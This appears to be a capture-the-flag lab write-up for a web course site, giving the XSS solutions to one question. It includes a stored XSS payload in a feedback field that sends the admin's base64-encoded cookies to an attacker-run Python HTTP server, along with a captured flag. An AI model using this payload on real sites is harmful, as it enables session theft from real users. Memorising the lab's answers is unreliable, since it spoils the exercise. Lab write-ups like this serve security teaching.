question 3:

Part 1
Login with Rajesh credential then go to any course and see feedback section at bottom.In feedback type: 
<script>alert("hello");</script>
A PopUp will come and we will get the flag:
FLAG{a2LTAn0b7XpbdnCSbZ8ZsnYIEoEzv36R} 

part2

Run the server as Attacker:
sudo python3 -m http.server 8000
Now in the feedback section type the xss payload as:
<script>var i=new Image(); i.src="http://<IP Address>:<PORT>/?cookie="+btoa(document.cookie);</script>
Where,
<IP Address> is the ens33 ip address and <PORT> is 8000
Now look in the terminal where server runs, admin will access the server after 1 min and we will get the cookie in terms of flag
